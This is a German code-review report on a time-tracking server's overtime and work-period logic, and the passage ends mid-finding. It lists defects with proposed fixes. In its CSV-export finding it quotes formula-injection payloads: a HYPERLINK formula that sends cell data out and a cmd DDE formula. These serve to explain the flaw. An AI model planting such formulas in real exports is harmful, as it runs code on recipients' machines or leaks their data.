---
phase: 11-datumsabh-ngige-berechnung
reviewed: 2026-08-22T00:00:00Z
depth: standard
files_reviewed: 38
files_reviewed_list:
  - server/package.json
  - server/scripts/create-admin.ts
  - server/src/scripts/createCompleteTestUser.ts
  - server/src/scripts/createEnhancedTestUser.ts
  - server/src/scripts/createNewEmployeeTestUser.ts
  - server/src/scripts/createOneTestUser.ts
  - server/src/scripts/createSuperTestUser.ts
  - server/src/scripts/migrateOvertimeToTransactions.ts
  - server/src/scripts/reproduceOvertimeCompDefect.ts
  - server/src/scripts/seedModelChangeUser.ts
  - server/src/scripts/seedTestData.ts
  - server/src/scripts/seedTestUsers.ts
  - server/src/scripts/validateAllTestUsers.ts
  - server/src/scripts/validateOvertimeCalculation.ts
  - server/src/scripts/validateOvertimeDetailed.ts
  - server/src/scripts/verifyPeriodNullEffect.ts
  - server/src/services/absencePeriodAwareness.test.ts
  - server/src/services/absenceService.ts
  - server/src/services/absenceVacationBooking.test.ts
  - server/src/services/exportService.ts
  - server/src/services/overtimeLiveCalculationService.test.ts
  - server/src/services/overtimeLiveCalculationService.ts
  - server/src/services/overtimeService.test.ts
  - server/src/services/overtimeService.ts
  - server/src/services/overtimeTransactionCentralization.test.ts
  - server/src/services/overtimeTransactionRebuildService.test.ts
  - server/src/services/overtimeTransactionRebuildService.ts
  - server/src/services/unifiedOvertimeService.test.ts
  - server/src/services/unifiedOvertimeService.ts
  - server/src/services/userService.ts
  - server/src/services/userWorkPeriodProvisioning.test.ts
  - server/src/services/workPeriodContext.test.ts
  - server/src/services/workPeriodContext.ts
  - server/src/services/workPeriodService.test.ts
  - server/src/services/workPeriodService.ts
  - server/src/test-support/workPeriodFixtures.ts
  - server/src/utils/workingDays.test.ts
  - server/src/utils/workingDays.ts
findings:
  critical: 6
  warning: 16
  info: 8
  total: 30
status: findings
---

# Phase 11: Code-Review-Bericht

**Geprüft:** 2026-08-22
**Tiefe:** standard
**Geprüfte Dateien:** 38
**Status:** findings

## Zusammenfassung

Der Kern des Umbaus ist sauber gebaut. `getDailyTargetHours()` löst die Sollstunden
ausschließlich über `WorkPeriodContext.resolve()` auf, `workPeriodContext.ts` hält den
Cache tatsächlich nur in einer Closure (D2 eingehalten, kein Modul-Singleton), und die
Intervallregel `[validFrom, validTo)` existiert weiterhin nur einmal
(`resolveWorkPeriodIn`). Der Pflichtparameter aus D3 zwingt die Aufrufer nachweislich in
die Signatur; die Tests in `workingDays.test.ts` und
`overtimeTransactionRebuildService.test.ts` belegen Stichtagswechsel, Feiertagsvorrang und
die Einmal-Ladung je Lauf mit echten Zählern statt mit Behauptungen.

Trotzdem hält der Umbau der adversarialen Prüfung nicht stand. Der zentrale Befund: D4
verwandelt eine fehlende Periode in einen **harten Laufzeitfehler**, aber die Kette, die
`users.hireDate` und `user_work_periods.validFrom` synchron halten müsste, ist unvollständig.
`updateUser()` spiegelt Wochenstunden und Wochenplan in die offene Periode — `hireDate`
jedoch nicht (CR-01). Eine Vorverlegung des Eintrittsdatums über die ganz normale
Nutzerverwaltung erzeugt damit ein Datum ohne Periode, und weil derselbe Codepfad direkt
danach `overtime_balance` löscht, schlägt jede folgende Überstundenabfrage dieses Nutzers
fehl. Derselbe Riss steckt im Seed-Weg (CR-02).

Zweiter Schwerpunkt: Die Werkzeuge, die den periodengültigen Maßstab *beweisen* sollen,
messen teilweise etwas anderes. `validateAllTestUsers.ts` liest die halbe Wahrheit aus einer
zweiten, fest verdrahteten Datenbankdatei (CR-03), und `validateOvertimeCalculation.ts`
rechnet Abwesenheitsgutschriften weiterhin über den heutigen Stammdatensatz, sobald der
Nutzer *heute* keinen Wochenplan hat (CR-04) — genau die Regel, die REQ-23 ablösen sollte.

Dazu kommen zwei Befunde außerhalb des Phasenkerns, aber innerhalb der geprüften Dateien:
eine ungeschützte CSV-Erzeugung im DATEV-Export (CR-05) und ein Migrationsskript, das
Buchungen löscht, bevor es sie neu berechnen kann (CR-06).

Die Blast-Radius-Frage ist ungelöst (WR-03): `MissingWorkPeriodError` wird an keiner Stelle
gefangen oder übersetzt, und die Sammelauswertungen über *alle* Nutzer haben keine
Vereinzelung. Ein einziger Nutzer mit Datendefekt legt damit Admin-Report, Aggregat-Statistik
und DATEV-Export für alle lahm.

---

## Critical Issues

### CR-01: `hireDate`-Änderung entkoppelt Nutzer und Periode — jede Folgeberechnung wirft

**Datei:** `server/src/services/userService.ts:298-300`, `337-390`, `407-420`
**Issue:**
`updateUser()` schreibt eine geänderte `hireDate` in `users` (Zeile 298-300). Die
Perioden-Spiegelung darunter (Zeile 337-390) reagiert ausschließlich auf `weeklyHours` und
`workSchedule`:

```ts
const weeklyHoursChanged = data.weeklyHours !== undefined && ...
const workScheduleChanged = data.workSchedule !== undefined && ...
const mustMirrorPeriod = weeklyHoursChanged || workScheduleChanged;
```

`validFrom` wird nirgends im Projekt nachgeführt — ein `grep` auf `SET validFrom` liefert
außerhalb der Migrationen keinen Treffer. Wird das Eintrittsdatum **vorverlegt** (z. B. von
`2025-03-01` auf `2025-01-01`, ein alltäglicher Korrekturfall), gilt für jeden Tag im
Intervall `[neues hireDate, validFrom)`:

- `periods.resolve()` liefert `null`,
- die D4-Ausnahme greift nicht, weil `dateStr < user.hireDate` **falsch** ist
  (`workingDays.ts:49-55`),
- `resolvePeriodForDate()` wirft `MissingWorkPeriodError`.

Verschärfend: Unmittelbar danach löscht derselbe Block `overtime_balance` für diesen Nutzer
(Zeile 411-414) mit dem Kommentar „will recalculate on next access". Die Neuberechnung
läuft über `ensureOvertimeBalanceEntries()` → `calculateMonthlyOvertime()` ab `hireDate` und
wirft ab dem ersten Tag. Ergebnis: Der Nutzer hat keinen Saldo mehr und kann auch keinen
mehr bekommen — jeder Abruf endet in einem 500er. Vor Phase 11 war dieselbe Änderung
folgenlos, weil `users.weeklyHours` gelesen wurde.

`userWorkPeriodProvisioning.test.ts` deckt `weeklyHours`- und `workSchedule`-Änderungen ab,
aber **keine** `hireDate`-Änderung — die Lücke ist auch nicht testweise erfasst.

**Fix:** Die Startperiode mitziehen, in derselben Transaktion wie das Nutzer-Update:

```ts
const hireDateChanged =
  data.hireDate !== undefined && data.hireDate !== existingUser.hireDate;

// innerhalb von applyUpdate(), nach dem UPDATE users:
if (hireDateChanged) {
  const periods = getWorkPeriods(id);            // aufsteigend nach validFrom
  const first = periods[0];
  if (!first) {
    ensureInitialWorkPeriod(existingUser, null);
  } else if (data.hireDate! < first.validFrom) {
    // Kette nach vorn verlängern — sonst entsteht ein Datum ohne Periode (D4)
    setWorkPeriodValidFrom(first.id, data.hireDate!);   // neu in workPeriodService.ts
  } else if (data.hireDate! > first.validFrom) {
    // Kette vorn kürzen oder bewusst stehen lassen — Entscheidung dokumentieren,
    // nicht dem Zufall überlassen
  }
}
```

Alternativ (falls Phase 12 den Stichtagswechsel ohnehin bringt): `hireDate`-Änderungen bis
dahin ablehnen statt sie in einen unauflösbaren Zustand laufen zu lassen. Ein stiller
Datendefekt ist die schlechteste der drei Varianten. In jedem Fall gehört ein Test
„`hireDate` vorverlegen → `checkPeriodChain()` bleibt `ok` und `getDailyTargetHours()` wirft
nicht" in `userWorkPeriodProvisioning.test.ts`.

---

### CR-02: `seedTestUsers.upsertUser()` aktualisiert Nutzer, aber nicht deren Periode

**Datei:** `server/src/scripts/seedTestUsers.ts:60-104`
**Issue:**
Der Update-Zweig schreibt `weeklyHours`, `workSchedule` **und** `hireDate` in `users` und
ruft danach `ensureInitialWorkPeriod(updatedUser, null)`. Diese Funktion ist per Vertrag
idempotent und tut **nichts**, wenn bereits eine Periode existiert
(`userService.ts:52-55`):

```ts
if (getWorkPeriods(user.id).length > 0) {
  return null;
}
```

Ein zweiter Lauf von `npm run seed:test-users` mit geänderten Sollwerten hinterlässt damit
einen Nutzer, dessen `users`-Zeile die neuen Werte trägt, dessen Berechnung aber die
**alten** Periodenwerte benutzt. Genau dieser Zustand fließt danach in
`npm run test-users:full` → `recalculate:overtime` → `validate:all-test-users`: Die
Validierung vergleicht Erwartungen aus der `users`-Zeile gegen Ergebnisse aus der Periode
und meldet Abweichungen, deren Ursache nicht im Rechenweg liegt. Wird zusätzlich `hireDate`
vorverlegt, gilt CR-01 hier genauso — dann wirft die Neuberechnung.

**Fix:** Im Update-Zweig dieselbe Spiegelung wie in `updateUser()` durchführen, statt sich
auf die idempotente Anlagefunktion zu verlassen:

```ts
const updatedUser = getUserById(existingUser.id);
if (updatedUser) {
  ensureInitialWorkPeriod(updatedUser, null);   // nur der Alt-Fall ohne Periode
  const current = getCurrentWorkPeriod(existingUser.id);
  if (current &&
      (current.weeklyHours !== userData.weeklyHours ||
       JSON.stringify(current.workSchedule ?? null) !==
       JSON.stringify(userData.workSchedule ?? null))) {
    updateWorkPeriodValues(current.id, userData.weeklyHours, userData.workSchedule ?? null);
  }
}
```

Sauberer und ohne dritten Schreibweg: den Update-Zweig auf `updateUser()` aus
`userService.ts` umstellen — dort steckt die Spiegelung bereits.

---

### CR-03: `validateAllTestUsers.ts` vergleicht Daten aus zwei verschiedenen Datenbanken

**Datei:** `server/src/scripts/validateAllTestUsers.ts:25`
**Issue:**

```ts
const db = new Database('./database/development.db');
```

Über diese Verbindung liest das Skript `holidays`, `absence_requests`, `time_entries` und
`overtime_balance`. Die Sollstunden kommen dagegen aus `getUserById()`,
`createWorkPeriodContext()` und `getDailyTargetHours()` — allesamt über die **geteilte**
Verbindung aus `database/connection.js`, deren Pfad `getDatabasePath()` bestimmt und die laut
`.claude/CLAUDE.md` per `DATABASE_PATH` gesetzt werden **muss**. Sobald `DATABASE_PATH`
gesetzt ist (also im vorgeschriebenen Betrieb), liest ein und derselbe Prüflauf Nutzer und
Perioden aus Datei A und Zeiteinträge, Abwesenheiten und Salden aus Datei B. Das Werkzeug
kann in dieser Form keine Aussage treffen — es meldet Abweichungen, die es selbst erzeugt,
oder verschweigt echte.

Zusätzlich legt `new Database(...)` ohne `fileMustExist` die Datei **an**, wenn sie fehlt
(Verstoß gegen „Neue DB-Files erstellen → verboten"), und der Pfad ist relativ zum
Arbeitsverzeichnis, nicht zum Skript. Der Quelltext-Kommentar (Zeile 13-19) benennt den
Zustand, hebt ihn aber nicht auf.

**Fix:** Die zweite Verbindung ersatzlos streichen und dasselbe Muster wie in
`validateOvertimeDetailed.ts` verwenden — Produktionsschutz zuerst, danach dynamischer
Import der geteilten Verbindung:

```ts
import { assertNotProduction } from './productionGuard.js';
assertNotProduction();

const { db } = await import('../database/connection.js');
const { getUserById } = await import('../services/userService.js');
const { getDailyTargetHours } = await import('../utils/workingDays.js');
const { createWorkPeriodContext } = await import('../services/workPeriodContext.js');
```

---

### CR-04: `validateOvertimeCalculation.validateUser()` rechnet weiter über den heutigen Stammdatensatz

**Datei:** `server/src/scripts/validateOvertimeCalculation.ts:259-269`
**Issue:**

```ts
if (user.workSchedule) {
  credit = calculateAbsenceHoursWithWorkSchedule(userPublic, absence.startDate, absence.endDate, periods);
} else {
  // Standard: daysRequired × (weeklyHours / 5)
  credit = absence.daysRequired * (user.weeklyHours / 5);
}
```

Die Verzweigung fragt den **heutigen** `users`-Datensatz. Zwei getrennte Fehler entstehen
daraus:

1. Ein Nutzer, der heute keinen Wochenplan hat, aber im Abwesenheitszeitraum einen hatte
   (oder umgekehrt), landet im `else`-Zweig und bekommt die Gutschrift nach der alten
   Regel — der Perioden-Kontext `periods` wird für diesen Nutzer nie benutzt.
2. Der `else`-Zweig multipliziert mit `user.weeklyHours` von **heute**. Genau der Wert, den
   REQ-23 als Maßstab abgelöst hat. Bei einem Modellwechsel (40h → 20h) bewertet das
   Werkzeug eine Abwesenheit aus der 40h-Zeit mit 20h.

Damit meldet das Prüfwerkzeug für Nutzer mit Modellwechsel systematisch eine Abweichung
zwischen sich selbst und dem Service — obwohl der Service richtig rechnet. Das ist die
Umkehrung seines Zwecks (REQ-25, D7: „kein Aufrufer rechnet an der neuen Signatur vorbei").
`daysRequired` als Faktor ist zusätzlich fehleranfällig, weil es Feiertage und 0h-Tage nicht
kennt.

**Fix:** Die Verzweigung ersatzlos entfernen — `calculateAbsenceHoursWithWorkSchedule()`
behandelt beide Fälle bereits korrekt über die Periode (`workingDays.ts:246-251`):

```ts
credit = calculateAbsenceHoursWithWorkSchedule(
  userPublic, absence.startDate, absence.endDate, periods
);
absenceCredits += credit;
```

Die gleiche Verzweigung steht in `validateScenario()` (Zeile 506-515). Dort ist sie wegen
des selbstgebauten `stubWorkPeriodContext` in sich stimmig, sollte aber aus demselben Grund
(eine Regel, eine Stelle) mit entfernt werden.

---

### CR-05: DATEV-/Historien-Export erzeugt CSV ohne jede Maskierung (Feldbruch + Formelinjektion)

**Datei:** `server/src/services/exportService.ts:105-119`, `140-142`, `355-361`, `374-380`, `391-397`
**Issue:**
Alle Zeilen entstehen durch reines `join(';')` über ungeprüfte Freitextfelder:

```ts
rows.push([
  user.id.toString(), user.lastName, user.firstName,
  ...
  entry.notes || ''
].join(';'));
```

`notes`, `reason`, `activity`, `location`, `firstName`/`lastName` sind
nutzergesteuerte Eingaben. Zwei Folgen:

1. **Strukturbruch:** Ein Semikolon oder ein Zeilenumbruch in einer Bemerkung verschiebt
   alle folgenden Spalten bzw. erzeugt eine zusätzliche Datenzeile. Der Export geht an
   Steuerberater und Betriebsprüfung (GoBD) — eine still verschobene Spalte ist dort kein
   Schönheitsfehler.
2. **Formelinjektion (CSV Injection):** Ein Feld, das mit `=`, `+`, `-` oder `@` beginnt,
   wird von Excel/LibreOffice beim Öffnen als Formel ausgewertet. Eine Bemerkung
   `=HYPERLINK("http://…"&A1,"ok")` oder `=cmd|'/c calc'!A1` führt beim Empfänger Code bzw.
   Datenabfluss aus. Jeder Mitarbeitende mit Zeiterfassungsrecht kann das auslösen.

**Fix:** Eine einzige Maskierfunktion einführen und ausnahmslos verwenden:

```ts
function csvField(value: unknown): string {
  let s = value === null || value === undefined ? '' : String(value);
  // Formelinjektion: gefährliche Anfangszeichen neutralisieren
  if (/^[=+\-@\t\r]/.test(s)) {
    s = `'${s}`;
  }
  // Strukturbruch: Trennzeichen, Anführungszeichen, Zeilenumbrüche quoten
  if (/[";\n\r]/.test(s)) {
    s = `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

rows.push([...].map(csvField).join(';'));
```

Gleiches für `historicalExportToCSV()` (Zeilen 355-397) und die Metadatenzeilen.

---

### CR-06: `migrateOvertimeToTransactions` löscht Buchungen, bevor es sie neu berechnen kann

**Datei:** `server/src/scripts/migrateOvertimeToTransactions.ts:197-231`
**Issue:**

```ts
for (const { date } of dates) {
  try {
    deleteEarnedTransactionsForDate(userId, date);          // Zeile 200 — löscht zuerst
    const targetHours = getDailyTargetHours(user, date, periods);  // Zeile 203 — kann werfen
    ...
  } catch (error) {
    logger.warn({ error, userId, date }, `⚠️ Failed to process date ${date}`);
    // Continue with next date
  }
}
```

Seit D4 kann Zeile 203 `MissingWorkPeriodError` werfen. Der `catch` schluckt den Fehler und
macht mit dem nächsten Datum weiter — die Löschung aus Zeile 200 ist zu diesem Zeitpunkt
bereits geschehen und wird nicht rückgängig gemacht. Das Skript hinterlässt für jeden
betroffenen Tag **keine** `earned`-Buchung, wo vorher eine stand. Es gibt keine umgebende
Transaktion (`db.transaction`) und keinen nicht-null Exit-Code; der Lauf meldet
„MIGRATION COMPLETED" mit einer Warnung im Log.

Zusätzlich ist ein `MissingWorkPeriodError` per D4 ausdrücklich ein **Datendefekt** und kein
Zustand, über den man hinweggehen darf — hier wird er zu einer Warnzeile degradiert.

**Fix:** Reihenfolge umdrehen und die Fehlerklasse nicht schlucken:

```ts
const targetHours = getDailyTargetHours(user, date, periods);   // erst rechnen
const actualHours = ...;
const overtime = actualHours.total - targetHours;

const apply = db.transaction(() => {
  deleteEarnedTransactionsForDate(userId, date);                // dann löschen
  if (overtime !== 0) {
    recordOvertimeEarned(userId, date, overtime, `Migration: Differenz Soll/Ist ${date}`);
  }
});
apply();
```

und im `catch`:

```ts
} catch (error) {
  if (error instanceof MissingWorkPeriodError) {
    throw error;   // Datendefekt — Lauf abbrechen, nicht weitermachen
  }
  ...
}
```

---

## Warnings

### WR-01: `getDailyTargetHours()` bestimmt den Wochentag aus drei verschiedenen Quellen

**Datei:** `server/src/utils/workingDays.ts:88-96`, `140`, `156`, `167-172`
**Issue:** Innerhalb einer Funktion gibt es drei Datumsauffassungen:

- `dateStr` über `formatDateBerlin(date, 'yyyy-MM-dd')` — explizit Europe/Berlin (Zeile 140),
  Grundlage für Feiertagsabfrage und Periodenauflösung;
- der Wochenplan-Zweig über `getDayName(date)` — für Strings `getUTCDay()`, für Date-Objekte
  `getDay()` (Prozess-Zeitzone) (Zeile 88-96, 156);
- die Wochenendprüfung des Fallback-Zweigs über `new Date(date).getDay()` (Zeile 167-168).

Unter `TZ=Europe/Berlin` fallen alle drei zusammen, deshalb fällt es nicht auf. Weicht die
Prozess-Zeitzone ab — lokale Entwicklung, ein CI-Runner ohne `TZ`, ein PM2-Neustart ohne
Environment — divergieren sie: Ein Nutzer **mit** Wochenplan wird nach UTC eingeordnet, ein
Nutzer **ohne** Wochenplan nach lokaler Zeit, und die Feiertagsabfrage nach Berlin. Damit
kann derselbe Kalendertag für zwei Nutzer auf zwei verschiedene Wochentage fallen. Das ist
genau die Fehlerklasse, die `.claude/CLAUDE.md` mit dem `toISOString()`-Verbot adressiert.

**Fix:** Genau eine Quelle, abgeleitet aus `dateStr`:

```ts
const dateStr = typeof date === 'string' ? date : formatDateBerlin(date, 'yyyy-MM-dd');
const [y, m, d] = dateStr.split('-').map(Number);
const dayIndex = new Date(Date.UTC(y, m - 1, d)).getUTCDay();
const dayName = DAY_NAMES[dayIndex];
...
if (dayIndex === 0 || dayIndex === 6) return 0;
```

### WR-02: `directWorkPeriodLookup` wird in Tagesschleifen benutzt — gegen den eigenen Vertrag

**Datei:** `server/src/services/absenceService.ts:827-833`, `897-907`
**Issue:** `workPeriodContext.ts:63-69` schreibt ausdrücklich: „Darf NUR für Einzelabfragen
verwendet werden, NICHT in Tagesschleifen." `approveAbsenceRequest()` übergibt genau diesen
Fallback zweimal an `calculateAbsenceHoursWithWorkSchedule()` — eine Funktion, die per
Definition über jeden Tag des Zeitraums iteriert (`workingDays.ts:222-252`) und für jeden
Tag `periods.resolve()` aufruft. Jeder dieser Aufrufe lädt über `resolveWorkPeriodAt()` die
komplette Periodenliste des Nutzers neu. Bei einem vierwöchigen Urlaub sind das 2 × 28
Volltabellenabfragen statt 1. Wichtiger als die Laufzeit: Der Vertrag der Datei stimmt nicht
mehr mit ihrer Verwendung überein, und der nächste Leser zieht daraus die falschen Schlüsse.

**Fix:** In beiden Fällen einen Lauf-Kontext bauen — die Funktion hat ohnehin schon einen
klar abgegrenzten Berechnungslauf:

```ts
const periods = createWorkPeriodContext();
const actualHoursRequired = calculateAbsenceHoursWithWorkSchedule(
  user, request.startDate, request.endDate, periods
);
```

Idealerweise **einen** Kontext für die gesamte `approveAbsenceRequest()`-Ausführung, damit
Vorbehalt (Zeile 828) und Abbuchung (Zeile 902) garantiert denselben Periodenstand sehen —
zwischen beiden liegt ein Commit und ein `await`.

### WR-03: Ein Nutzer ohne Periode legt Report, Statistik und Export für alle Nutzer lahm

**Datei:** `server/src/services/overtimeService.ts:910-935`, `975-982`; `server/src/services/exportService.ts:70-103`
**Issue:** D4 macht die fehlende Periode zum harten Fehler. Die Sammelauswertungen laufen
aber unvereinzelt über alle Nutzer:

```ts
for (const user of users) {
  await ensureOvertimeBalanceEntries(user.id, endMonth);   // wirft → ganze Schleife bricht ab
}
```

`MissingWorkPeriodError` wird im gesamten Server an keiner Stelle gefangen oder übersetzt
(`grep` liefert nur Kommentare und Tests). Folge: Ein einziger Nutzer mit Datendefekt —
Alt-Import, gescheitertes Seed, CR-01 — führt zu einem 500er mit deutschem Rohtext für den
Admin-Report, die Aggregat-Statistik und den DATEV-Export **aller** Nutzer. Es gibt außerdem
kein Werkzeug, das den Bestand vorab durchsucht: `checkPeriodChain()` arbeitet je Nutzer und
hat keinen Aufrufer über alle Nutzer.

**Fix:** Zwei Maßnahmen:

```ts
// 1. Vereinzeln: ein defekter Nutzer darf den Report der anderen nicht töten
for (const user of users) {
  try {
    await ensureOvertimeBalanceEntries(user.id, endMonth);
  } catch (err) {
    if (err instanceof MissingWorkPeriodError) {
      logger.error({ userId: user.id, err }, 'Datendefekt: Nutzer ohne Arbeitszeitperiode — übersprungen');
      continue;
    }
    throw err;
  }
}
```

2. Einen Sammel-Check ergänzen (`checkAllPeriodChains()` oder ein Health-Check-Feld), der
Nutzer ohne lückenlose Kette ab `hireDate` meldet, **bevor** eine Berechnung darüber
stolpert. Ohne den ist D4 („eine fehlende Periode muss auffallen") nur die halbe Zusage: Sie
fällt auf, aber erst als Ausfall.

### WR-04: `create-admin.ts` legt Nutzer und Startperiode ohne Transaktion an

**Datei:** `server/scripts/create-admin.ts:98-133`
**Issue:** `INSERT INTO users` (Zeile 113) und `ensureInitialWorkPeriod()` (Zeile 133) sind
zwei getrennte Schreibvorgänge. Scheitert der zweite — Trigger aus Migration 008, gesperrte
Datei, `getUserById()` liefert `undefined` (Zeile 130) — bleibt ein Admin ohne Periode
zurück. Das ist exakt der Zustand, den der Kommentar darüber verhindern will, und beim
allerersten Nutzer eines Systems fällt er sofort auf die Füße. `createUser()` in
`userService.ts:163-211` macht es richtig und klammert beides in `db.transaction`.

**Fix:** Entweder `createUser()` aus `../dist/services/userService.js` verwenden (dieselbe
Validierung, dieselbe Transaktion, ein Schreibweg) oder hier klammern:

```ts
const createAdminAndPeriod = db.transaction(() => {
  const result = stmt.run(...);
  const newAdminId = result.lastInsertRowid as number;
  const created = getUserById(newAdminId);
  if (!created) throw new Error(`create-admin: Nutzer ${newAdminId} nach Anlage nicht gefunden`);
  ensureInitialWorkPeriod(created, null);
  return newAdminId;
});
```

### WR-05: „Überschreiben? (ja/nein)" überschreibt nichts

**Datei:** `server/scripts/create-admin.ts:73-83`
**Issue:** Bei vorhandenem Admin fragt das Skript nach dem Überschreiben. Antwortet der
Operator „ja", passiert **kein** Überschreiben — der Code fällt einfach durch zur
Username-Prüfung und legt einen *zusätzlichen* Admin an. Wer die Frage wörtlich nimmt, geht
davon aus, das alte Konto sei entwertet. Es bleibt aktiv, inklusive altem Passwort.

**Fix:** Entweder die Frage wahrheitsgemäß formulieren („Es existiert bereits ein Admin.
Trotzdem einen weiteren anlegen? (ja/nein)") oder das Überschreiben tatsächlich umsetzen
(Passwort/Rolle des bestehenden Admins aktualisieren statt einen zweiten anzulegen).

### WR-06: `create-admin.ts` gibt das Klartext-Passwort auf der Konsole aus

**Datei:** `server/scripts/create-admin.ts:139`
**Issue:**

```ts
console.log(`   Passwort: ${password}`);
```

Das Passwort landet damit im Terminal-Scrollback, in `script`/`tee`-Mitschnitten, in
CI-Logs und in jedem Deployment-Protokoll, in dem das Skript läuft. Zusätzlich liest
`readline.question()` die Eingabe mit Echo — das Passwort steht bereits beim Tippen sichtbar
auf dem Schirm. `.claude/CLAUDE.md` verbietet Klartext-Passwörter ausdrücklich.

**Fix:** Die Ausgabezeile streichen (der Operator hat das Passwort gerade selbst eingegeben)
und die Eingabe ohne Echo lesen, z. B. über `readline` mit unterdrücktem `output.write` oder
ein Passwort-Prompt-Modul.

### WR-07: Zwei nicht abgewartete Promises in `updateUser()` — der `catch` ist wirkungslos

**Datei:** `server/src/services/userService.ts:422-428`, `438-445`
**Issue:**

```ts
try {
  recalculateOvertimeForUser(id);        // async, ohne await
  logger.info('✅ Overtime recalculated');
} catch (error) {
  logger.error({ err: error }, '❌ Failed to recalculate overtime');
}
```

`recalculateOvertimeForUser` ist `async` (Zeile 477). Ohne `await` gibt der Aufruf sofort
ein Promise zurück; der `try/catch` kann nie greifen. Drei Folgen: (1) Der Erfolgs-Log
erscheint, bevor überhaupt gerechnet wurde. (2) Ein Fehler wird zur unbehandelten
Promise-Rejection — unter Node 20 beendet das per Default den Prozess, der Server geht
also potenziell hart down. (3) Die Antwort an den Client geht raus, während die
Neuberechnung noch läuft; ein direkt folgender Abruf liefert Zwischenstände. Seit D4 ist die
Fehlerwahrscheinlichkeit real gestiegen (siehe CR-01).

**Fix:** `await recalculateOvertimeForUser(id);` an beiden Stellen.

### WR-08: `console.log`-Debugausgaben in aktiven Produktionspfaden

**Datei:** `server/src/services/absenceService.ts:972-1127` (26 Vorkommen), `server/src/services/overtimeService.ts:231-410` (21 Vorkommen)
**Issue:** `rejectAbsenceRequest()` protokolliert den kompletten Ablauf inklusive Parametern
über `console.log` — nicht über den konfigurierten `pino`-Logger. Das ist ein aktiver
API-Pfad. Die Ausgaben umgehen Loglevel, Redaktion und strukturierte Felder und landen
ungefiltert in `pm2 logs`. `.claude/CLAUDE.md` verbietet `console.log` in Production
ausdrücklich („Debug console.logs entfernt" in der Pre-Commit-Checkliste).

**Fix:** Auf `logger.debug({...}, '...')` umstellen bzw. entfernen. Für die toten Funktionen
in `overtimeService.ts` gilt WR-16.

### WR-09: `any` an zwölf Stellen — gegen die verbindliche Strict-Mode-Regel

**Datei:** `server/src/utils/workingDays.ts:322,364,547`; `server/src/services/userService.ts:91,116,812`; `server/src/services/unifiedOvertimeService.ts:340`; `server/src/services/overtimeTransactionRebuildService.ts:308,482,485`; `server/src/services/exportService.ts:276,304,305`; `server/src/scripts/validateOvertimeCalculation.ts:139`
**Issue:** `.claude/CLAUDE.md` verlangt `unknown` + Type Guard statt `any`. Besonders heikel
sind zwei Stellen: `absence.type as any` (`overtimeTransactionRebuildService.ts:308`)
schmuggelt einen beliebigen String in eine enge Union — ein neuer Abwesenheitstyp in der
Datenbank rutscht damit unerkannt in `handleAbsenceDay()` und fällt erst dort durch alle
`case`-Zweige. Und `dbInstance?: any` (`workingDays.ts:322,364,547`) macht jede beliebige
Übergabe typkorrekt, auch eine falsche Verbindung — genau die Fehlerklasse aus CR-03.

**Fix:** `dbInstance?: Database.Database` (Typ aus `better-sqlite3`), Zeilen-Casts auf
konkrete Row-Interfaces (das Projekt hat mit `UserWorkPeriodRow` bereits das Muster), und für
`absence.type` einen Typwächter:

```ts
const ABSENCE_TYPES = ['vacation','sick','overtime_comp','special','unpaid'] as const;
type AbsenceType = (typeof ABSENCE_TYPES)[number];
function isAbsenceType(v: unknown): v is AbsenceType {
  return typeof v === 'string' && (ABSENCE_TYPES as readonly string[]).includes(v);
}
```

### WR-10: Dynamisch zusammengesetztes SQL im Historien-Export

**Datei:** `server/src/services/exportService.ts:262-271`
**Issue:**

```ts
const years = Array.from({ length: endYear - startYear + 1 }, (_, i) => startYear + i);
const vacationBalanceQuery = userId
  ? `SELECT * FROM vacation_balance WHERE userId = ? AND year IN (${years.join(',')}) ORDER BY year`
  : `SELECT * FROM vacation_balance WHERE year IN (${years.join(',')}) ORDER BY year`;
```

Die Werte stammen aus `parseInt()` und sind daher nicht injizierbar — die Regel „Prepared
Statements (PFLICHT!)" ist trotzdem verletzt, und zwei echte Laufzeitfehler bleiben:
Bei `endYear < startYear` (vertauschte Parameter) ist `length` negativ, `years` leer und die
Abfrage lautet `year IN ()` → SQL-Syntaxfehler. Bei einem unparsbaren Datum wird
`parseInt()` zu `NaN` und die Abfrage lautet `year IN (NaN)` → Fehler. Beides endet als
500er ohne verwertbare Meldung.

**Fix:** Platzhalter erzeugen und die Eingaben vorher prüfen:

```ts
if (!Number.isInteger(startYear) || !Number.isInteger(endYear) || endYear < startYear) {
  throw new Error(`Ungültiger Zeitraum: ${startDate} bis ${endDate}`);
}
const placeholders = years.map(() => '?').join(',');
db.prepare(`SELECT * FROM vacation_balance WHERE year IN (${placeholders}) ORDER BY year`).all(...years);
```

### WR-11: DATEV-Export überspringt gelöschte Nutzer trotz gegenteiliger Absicht

**Datei:** `server/src/services/exportService.ts:58-77`
**Issue:** Der Kommentar sagt „Get all users (including deleted for historical accuracy)",
und die Abfrage selektiert tatsächlich ohne `deletedAt`-Filter. Direkt danach:

```ts
const fullUser = getUserById(user.id);
if (!fullUser) { logger.warn(...); continue; }
```

`getUserById()` filtert `WHERE id = ? AND deletedAt IS NULL` (`userService.ts:112`). Jeder
soft-gelöschte Nutzer wird also mit einer Warnung übersprungen — seine Zeiteinträge und
Abwesenheiten fehlen im Export. Für einen Export, der ausdrücklich für Finanzamt und
Betriebsprüfung gedacht ist (GoBD, Aufbewahrungsfrist im Metadatenblock), ist das ein
stiller Datenverlust: Die Datei sieht vollständig aus.

**Fix:** Eine Ladefunktion verwenden, die gelöschte Nutzer bewusst einschließt (z. B.
`getUserByIdIncludingDeleted()`), oder das benötigte `workSchedule`/`hireDate` in die
bestehende `users`-Abfrage in Zeile 59-63 aufnehmen und `getUserById()` ganz vermeiden.

### WR-12: Desktop-Vorschau rechnet weiter mit dem heutigen Stammdatensatz

**Datei:** `desktop/src/utils/timeUtils.ts:213-245`, `desktop/src/components/absences/AbsenceRequestForm.tsx:62-80`
**Issue:** Der Phasenumfang nennt ausdrücklich „Alle Aufrufer nachziehen (Services,
Validierungsskripte, **Desktop-Anzeigen**)". Die Desktop-Kopie von
`calculateAbsenceHoursWithWorkSchedule()` bekommt weiterhin `selectedUser.workSchedule` und
`selectedUser.weeklyHours` — also den heutigen Stand — und kennt zusätzlich gar keine
Feiertage. Für eine Abwesenheit über einen Stichtag zeigt das Formular damit 40h an, während
der Server 28h bucht (genau das Szenario aus `absencePeriodAwareness.test.ts`). Der Nutzer
sieht eine Zahl, die nicht gilt; der Genehmigungsvorbehalt lehnt scheinbar grundlos ab.

**Fix:** Kurzfristig die Vorschau vom Server holen (die Anreicherung
`calculatedHours` existiert bereits in `getAbsenceRequestsPaginated`) statt sie im Client
